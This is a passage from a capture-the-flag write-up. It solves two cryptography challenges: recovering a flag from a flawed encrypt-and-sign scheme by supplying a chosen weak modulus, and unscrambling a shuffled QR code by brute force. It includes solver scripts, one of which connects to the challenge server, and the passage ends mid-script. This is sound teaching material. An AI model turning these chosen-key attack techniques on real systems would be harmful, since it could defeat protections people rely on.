</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Your ciphertext:&#34;</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The author tries to implement the encryption scheme proposed in the attached paper, and tries to show the vulnerability of the scheme. Let&rsquo;s try to understand the implemented code first.</p>
<p>First, the code initialize the encryption class, which will generate some parameters, where the public key is tuple of $(n^2, e, \beta)$</p>
<p>Second, the code will try to encrypt and sign with the Bob&rsquo;s public key, where the value of $r$ and $s$ is calculated like below:
$$
r = k^e \mod n^2 \\
s = (m.k.(\beta^l \mod n^2)) \mod n^2
$$
where:</p>
<ul>
<li>$m$ is the message.</li>
<li>$n^2$ is the squared modulus ($p^2q^2$).</li>
<li>$k$ and $l$ are random integers in the range of $n^2$.</li>
</ul>
<p>Then, the code will give us the ($r$, $s$, $n^2$, $e$, $\beta$) values.</p>
<p>After that, the code will give us two tries to try <code>encrypt_and_sign</code>, where we can send our own:</p>
<ul>
<li>public key</li>
<li>message</li>
</ul>
<p>Based on this information, we need to somehow decrypt the encrypted flag that the code gave us.</p>
<h3 id="solution-3">Solution</h3>
<p>Let&rsquo;s try to take a closer look in the equation of the encryption:
$$
s = (m.k.(\beta^l \mod n)) \mod n
$$</p>
<p>In order to recover $m$, missing values that we need to recover are $k$ and $l$. So, the target here is given the two tries that the server gave to us, we need to somehow recover those values.</p>
<p>Recovering $k$ is easy. Observe that if we send a huge public modulus, and use $e=1$, the $r$ value that is returned by the server will be equivalent to value $k$.</p>
<p>Now, that we know $k$, with the $s$ that we get from the server during our own trial, we can recover the value of $(\beta^l \mod n)$, because:
$$
(\beta^l \mod n) = s.k^{-1}.m^{-1} \mod n
$$</p>
<p>So now, to recover $l$, this is a classic discrete logarithm problem. Remember that we can select our own $n$ and $\beta$. We can simply use weak $n$, so that the discrete logarithm can be computed in a short time.</p>
<p>After we recover $k$ and $l$, we can easily recover the flag based on the below equation:
$$
m = s.k^{-1}.(\beta^l \mod n)^{-1} \mod n
$$</p>
<p>Below is the solver that I used to solve the challenge (sage file):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;178.128.102.145&#39;</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="mi">50001</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">_r</span><span class="p">,</span> <span class="n">_s</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">n2</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">beta</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">my_n</span> <span class="o">=</span> <span class="mi">3637793</span><span class="o">**</span><span class="mi">100</span> 
</span></span><span class="line"><span class="cl"><span class="n">my_e</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">my_beta</span> <span class="o">=</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="mi">97</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;modulus: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">my_n</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;e: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">my_e</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;beta: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">my_beta</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;sign: &#39;</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="n">m</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">k</span> <span class="o">=</span> <span class="n">Integer</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">Integer</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pow_beta</span> <span class="o">=</span> <span class="p">(((</span><span class="n">s</span><span class="o">*</span><span class="n">inverse_mod</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">my_n</span><span class="p">))</span> <span class="o">%</span> <span class="n">my_n</span><span class="p">)</span><span class="o">*</span><span class="n">inverse_mod</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">my_n</span><span class="p">))</span> <span class="o">%</span> <span class="n">my_n</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">l</span> <span class="o">=</span> <span class="n">discrete_log</span><span class="p">(</span><span class="n">pow_beta</span><span class="p">,</span> <span class="n">Mod</span><span class="p">(</span><span class="n">my_beta</span><span class="p">,</span> <span class="n">my_n</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="p">(((</span><span class="n">_s</span><span class="o">*</span><span class="n">inverse_mod</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">n2</span><span class="p">))</span> <span class="o">%</span> <span class="n">n2</span><span class="p">)</span><span class="o">*</span><span class="n">inverse_mod</span><span class="p">(</span><span class="n">Integer</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">beta</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">n2</span><span class="p">)),</span> <span class="n">n2</span><span class="p">))</span> <span class="o">%</span> <span class="n">n2</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">flag</span><span class="p">)))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><strong>Flag: CJ2023{dont_roll_your_own_crypto_part_xxxxx_idk}</strong></p>
</blockquote>
<h2 id="chokaro">chokaro</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Fyi, QR code is just NxN matrix in GF(2)</div>
        </div>
    </div>
<h3 id="initial-analysis-4">Initial Analysis</h3>
<p>In this challenge, we were given a file called <code>encrypt.py</code> and <code>mixed.png</code>. Let&rsquo;s start by checking the encryption file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="nn">np</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">qrcode</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mix</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">arr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">mod</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">narr</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="n">shape</span><span class="o">=</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span><span class="n">mod</span><span class="p">),</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">bool</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">),</span> <span class="n">element</span> <span class="ow">in</span> <span class="n">np</span><span class="o">.</span><span class="n">ndenumerate</span><span class="p">(</span><span class="n">arr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">nx</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="n">y</span> <span class="o">*</span> <span class="n">a</span><span class="p">)</span> <span class="o">%</span> <span class="n">mod</span>
</span></span><span class="line"><span class="cl">        <span class="n">ny</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="n">b</span> <span class="o">+</span> <span class="n">y</span> <span class="o">*</span> <span class="p">(</span><span class="n">a</span> <span class="o">*</span> <span class="n">b</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span> <span class="o">%</span> <span class="n">mod</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">narr</span><span class="p">[</span><span class="n">nx</span><span class="p">][</span><span class="n">ny</span><span class="p">]</span> <span class="o">=</span> <span class="n">element</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">narr</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rescale</span><span class="p">(</span><span class="n">arr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">mod</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">final_arr</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="n">shape</span><span class="o">=</span><span class="p">(</span><span class="n">mod</span><span class="o">*</span><span class="mi">10</span><span class="p">,</span><span class="n">mod</span><span class="o">*</span><span class="mi">10</span><span class="p">),</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">bool</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">mod</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">mod</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">final_arr</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">10</span><span class="p">:(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">10</span><span class="p">,</span> <span class="n">j</span><span class="o">*</span><span class="mi">10</span><span class="p">:(</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="n">arr</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">final_arr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">FLAG</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">qr</span> <span class="o">=</span> <span class="n">qrcode</span><span class="o">.</span><span class="n">QRCode</span><span class="p">(</span><span class="n">border</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">qr</span><span class="o">.</span><span class="n">add_data</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">qr</span><span class="o">.</span><span class="n">make</span><span class="p">(</span><span class="n">fit</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">mat</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">(</span><span class="n">qr</span><span class="o">.</span><span class="n">get_matrix</span><span class="p">(),</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">bool</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">mat</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">mat</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">scrambled</span> <span class="o">=</span> <span class="n">mat</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">22</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">scrambled</span> <span class="o">=</span> <span class="n">mix</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">scrambled</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">scrambled</span> <span class="o">=</span> <span class="n">rescale</span><span class="p">(</span><span class="n">scrambled</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">fromarray</span><span class="p">(</span><span class="n">scrambled</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">img</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s1">&#39;mixed.png&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>To summarize, the code start by creating a QR code that can be decoded to the <code>FLAG</code>. Then, the code convert the QR code into matrix of boolean.</p>
<p>The code generate two random number $a$ and $b$, then it try to <code>mix</code> the matrix 22 times with the $a$ and $b$ values. The <code>mix</code> function itself was trying to scramble the array by doing some linear equations with the index like below:
$$
nx = (x + y * a) \mod \text{len(arr)} \\
ny = (x * b + y * (a * b + 1)) \mod \text{len(arr)}
$$</p>
<p>After that, it will try to <code>rescale</code> the image.</p>
<p>Based on this scheme, the target is to recover the <code>mixed.png</code> and get the correct QRCode image.</p>
<h3 id="solution-4">Solution</h3>
<p>We can see that the value of $a$ and $b$ are very small, which means that it is bruteforce-able. Observe that if we can guess the value of $a$ and $b$, the <code>mix</code> function will become two linear equations with two unknowns ($x$, $y$) under modulo $len(arr)$. We can simply:</p>
<ul>
<li>unscale the <code>mixed.png</code></li>
<li>for each mix iteration, try to recover the original value of $x$ and $y$ by solving the linear equations.</li>
</ul>
<p>Below is the script that I used to solve the challenge (sage). This script will basically generate a lot of images based on the pair of $a$ and $b$ that we brute-forced. We just need to find one image which is the QRCode of the <code>FLAG</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="nn">np</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">unscale</span><span class="p">(</span><span class="n">final_arr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">mod</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">final_arr</span><span class="p">)</span><span class="o">//</span><span class="mi">10</span>
</span></span><span class="line"><span class="cl">    <span class="n">arr</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="n">shape</span><span class="o">=</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">mod</span><span class="p">),</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">bool</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">mod</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">mod</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">arr</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">final_arr</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">10</span><span class="p">,</span> <span class="n">j</span><span class="o">*</span><span class="mi">10</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">arr</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="nb">int</span><span class="p">)</span><span class="o">.</span><span class="n">tolist</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">unmix</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">arr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">mod</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">R</span> <span class="o">=</span> <span class="n">IntegerModRing</span><span class="p">(</span><span class="n">mod</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">real_mat</span> <span class="o">=</span> <span class="p">[[</span><span class="mi">0</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">mod</span><span class="p">)]</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">mod</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">mod</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">mod</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">M</span> <span class="o">=</span> <span class="n">Matrix</span><span class="p">(</span><span class="n">R</span><span class="p">,</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="p">[</span><span class="mi">1</span><span class="p">,</span>       <span class="n">a</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">                <span class="p">[</span><span class="n">b</span><span class="p">,</span> <span class="p">(</span><span class="n">a</span><span class="o">*</span><span class="n">b</span><span class="o">+</span><span class="mi">1</span><span class="p">)],</span>
</span></span><span class="line"><span class="cl">            <span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="n">target</span> <span class="o">=</span> <span class="n">vector</span><span class="p">(</span><span class="n">R</span><span class="p">,</span> <span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">M</span><span class="o">.</span><span class="n">solve_right</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">real_mat</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="n">y</span><span class="p">]</span> <span class="o">=</span> <span class="n">arr</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">real_mat</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rescale</span><span class="p">(</span><span class="n">arr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">mod</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">final_arr</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="n">shape</span><span class="o">=</span><span class="p">(</span><span class="n">mod</span><span class="o">*</span><span class="mi">10</span><span class="p">,</span><span class="n">mod</span><span class="o">*</span><span class="mi">10</span><span class="p">),</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">bool</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">mod</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">mod</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">final_arr</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">10</span><span class="p">:(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">10</span><span class="p">,</span> <span class="n">j</span><span class="o">*</span><span class="mi">10</span><span class="p">:(</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="n">arr</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">final_arr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">image</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;mixed.png&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">image_array</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">image_array</span><span class="p">)</span><span class="o">//</span><span class="mi">10</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">image_array</span><span class="p">)</span><span class="o">//</span><span class="mi">10</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">scrambled</span> <span class="o">=</span> <span class="n">unscale</span><span class="p">(</span><span class="n">image_array</span><span class="p">)</span>
